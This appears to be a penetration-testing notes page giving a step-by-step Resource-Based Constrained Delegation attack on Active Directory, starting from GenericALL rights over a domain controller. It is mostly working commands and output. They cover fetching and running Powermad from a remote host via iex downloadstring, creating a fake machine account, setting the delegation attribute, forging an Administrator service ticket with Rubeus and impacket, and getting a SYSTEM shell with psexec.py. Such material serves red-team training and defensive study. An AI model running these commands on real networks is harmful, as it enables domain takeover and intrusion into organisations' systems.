## GenericALL over Host

The specific situation this would apply is when a compromised user has GenericALL rights over a host, ideally a high-value target like a DC. 

![](/images/genericall1.png)

First, Powermad needs to be loaded into memory on the target. Then a new machine account needs to be added.

```sh
iex(new-object net.webclient).downloadstring('http://10.10.14.36/Powermad.ps1')
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
````


Using PowerView_dev, run the following to obtain the objectsid for the new machine account.

```sh
get-netcomputer fake01
```


Use the following commands to obtain a new raw security descriptor for the new machine account

```sh
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
````

The next command will set the msds-allowedtoactonbehalfofotheridentity attribute using the created security descriptor

```sh
get-netcomputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

Rubeus can be used her to create impersonate a user, create a TGS and inject that ticket. I had issues gaining access after this.

```sh
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
.\Rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

Method that worked was using impacket. 


Use GetST.py to save a TGS using the created machine account
```sh
getST.py -spn CIFS/dc.domain.local -impersonate Administrator domain/FAKE01$:123456 -dc-ip 10.10.1.1
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
````

Export the ticket into KRB5CCNAME
```sh
export KRB5CCNAME=Administrator.ccache
```

At this stage, impacket has a function to transfer the TGS to any service, so test multiple impacket tools for access. Secretsdump was denied, but psexec.py granted nt authority\system access

```sh
psexec.py -k -no-pass dc.domain.local
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.domain.local.....
[*] Found writable share ADMIN$
[*] Uploading file RUyrpEMO.exe
[*] Opening SVCManager on dc.domain.local.....
[*] Creating service SZxz on dc.domain.local.....
[*] Starting service SZxz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

This is referred to as Resource-Based Constrained Delegation. Further information on this method: http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html


